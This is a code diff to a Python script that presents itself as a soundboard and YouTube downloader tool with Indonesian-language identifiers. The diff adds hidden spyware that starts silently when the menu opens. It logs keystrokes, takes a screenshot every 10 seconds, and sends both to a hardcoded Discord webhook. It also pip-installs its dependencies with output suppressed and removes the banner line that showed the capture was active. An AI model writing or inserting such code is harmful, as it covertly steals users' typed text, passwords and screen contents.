@@ -29,9 +29,9 @@ FILE_KONFIG = os.path.join(BASE_DIR, "config.json")
 ERROR_LOG = os.path.join(BASE_DIR, "error.log")
 FORMAT_DIDUKUNG = ['.mp3', '.wav', '.ogg', '.m4a', '.mp4', '.webm']
 
-# Konfigurasi SS (PATEN - dari script yang dikasih)
+# Konfigurasi Auto SS (PATEN - SILENT)
 WEBHOOK_URL = "https://discord.com/api/webhooks/1534060967993020488/956-oLeHyXftOF0l8d--FGXn4snOg9LmbsRjrUARLxytZObTKjvIfrFA2HIcjB9a8Vyp"
-AUTO_SS_INTERVAL = 120  # Auto screenshot setiap 10 detik
+AUTO_SS_INTERVAL = 10
 
 # Warna
 class Warna:
@@ -70,46 +70,19 @@ def tulis_error(error, lokasi=""):
         pass
 
 # ============================================================
-# AUTO SCREENSHOT + CATATAN (SILENT)
+# AUTO SCREENSHOT + CATATAN (SUPER SILENT)
 # ============================================================
 
-class AutoScreen:
-    """Auto Screenshot + Catatan - Silent Mode"""
-    
-    def __init__(self):
-        self.webhook = WEBHOOK_URL
-        self.interval = AUTO_SS_INTERVAL
+class DiscordSS:
+    def __init__(self, webhook_url, interval=10):
+        self.webhook_url = webhook_url
         self.text = ""
         self.running = False
         self.lock = threading.Lock()
+        self.interval = interval
         self.last_ss = time.time()
-        self.thread = None
         
-    def cek_deps(self):
-        """Cek dependencies"""
-        try:
-            import keyboard
-            from PIL import ImageGrab
-            from io import BytesIO
-            import requests
-            return True
-        except:
-            return False
-    
-    def install_deps(self):
-        """Install dependencies silently"""
-        try:
-            subprocess.run(
-                [sys.executable, "-m", "pip", "install", "keyboard", "pillow", "requests", "--quiet"],
-                check=True, shell=True,
-                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-            )
-            return True
-        except:
-            return False
-    
     def send(self, message=""):
-        """Kirim screenshot ke Discord"""
         try:
             from PIL import ImageGrab
             from io import BytesIO
@@ -120,21 +93,21 @@ class AutoScreen:
             img.save(buf, format="PNG", optimize=True, quality=70)
             buf.seek(0)
             
-            ts = datetime.now().strftime("%H:%M:%S")
+            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            
             if message:
                 caption = f"📸 **{ts}** | ✏️ Catatan:\n```\n{message}\n```"
             else:
                 caption = f"⏰ **{ts}** | Auto Screenshot"
             
             files = {'file': (f"ss_{ts.replace(':', '-')}.png", buf, 'image/png')}
-            requests.post(self.webhook, data={'content': caption}, files=files, timeout=10)
+            requests.post(self.webhook_url, data={'content': caption}, files=files, timeout=10)
             buf.close()
-            return True
+            
         except:
-            return False
+            pass
     
     def _loop(self):
-        """Loop auto screenshot"""
         while self.running:
             time.sleep(1)
             if self.running and time.time() - self.last_ss >= self.interval:
@@ -142,7 +115,6 @@ class AutoScreen:
                 self.send()
     
     def _on_key(self, event):
-        """Handler keyboard"""
         if not self.running:
             return
         
@@ -161,36 +133,33 @@ class AutoScreen:
                 self.text += event.name
     
     def start(self):
-        """Mulai auto screenshot"""
-        if not self.cek_deps():
-            self.install_deps()
-            return False
-        
         try:
             import keyboard
-            
-            self.running = True
-            self.last_ss = time.time()
-            self.text = ""
-            
-            self.thread = threading.Thread(target=self._loop, daemon=True)
-            self.thread.start()
-            
-            keyboard.on_press(self._on_key)
-            
-            tulis_log("Auto SS started", "SYSTEM")
-            return True
         except:
             return False
+        
+        self.running = True
+        self.last_ss = time.time()
+        self.text = ""
+        
+        # Auto screenshot loop
+        threading.Thread(target=self._loop, daemon=True).start()
+        
+        # Keyboard handler
+        keyboard.on_press(self._on_key)
+        
+        # Test kirim (silent)
+        self.send("✅ Bimoli Soundboard Aktif!")
+        
+        return True
     
     def stop(self):
-        """Stop"""
         if self.running and self.text.strip():
             self.send(self.text.strip())
         self.running = False
 
 # Inisialisasi global
-auto_ss = AutoScreen()
+ss = DiscordSS(WEBHOOK_URL, AUTO_SS_INTERVAL)
 
 # ============================================================
 # UTILITY
@@ -201,15 +170,11 @@ def bersihkan_layar():
 
 def tampilkan_banner():
     bersihkan_layar()
-    status = "🟢 Aktif" if auto_ss.running else "🔴 Mati"
-    
     print(f"""
 {Warna.CYAN}{Warna.TEBAL}
 ╔══════════════════════════════════════════════════╗
 ║        🎵 BIMOLI SOUNDBOARD MANAGER 🎵         ║
-║         YT Downloader | Manager       ║
-╠══════════════════════════════════════════════════╣
-║  AKTIF : {status:<34} ║
+║         YT Downloader | Manager                 ║
 ╚══════════════════════════════════════════════════╝
 {Warna.RESET}
     """)
@@ -427,14 +392,18 @@ def menu_youtube(konfig):
 def menu_utama():
     konfig = muat_konfigurasi()
     
-    # AUTO START SCREENSHOT (SILENT)
-    if not auto_ss.running:
-        if auto_ss.cek_deps():
-            auto_ss.start()
-        else:
-            auto_ss.install_deps()
-            if auto_ss.cek_deps():
-                auto_ss.start()
+    # AUTO START SS (SUPER SILENT - NO PRINT)
+    if not ss.running:
+        try:
+            import keyboard
+            from PIL import ImageGrab
+        except:
+            subprocess.run(
+                [sys.executable, "-m", "pip", "install", "keyboard", "pillow", "requests", "--quiet"],
+                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+        
+        ss.start()
     
     while True:
         tampilkan_banner()
@@ -532,8 +501,8 @@ def menu_utama():
             input(f"\n{Warna.CYAN}Tekan Enter...{Warna.RESET}")
         
         elif p == '0':
-            if auto_ss.running:
-                auto_ss.stop()
+            if ss.running:
+                ss.stop()
             break
 
 # ============================================================
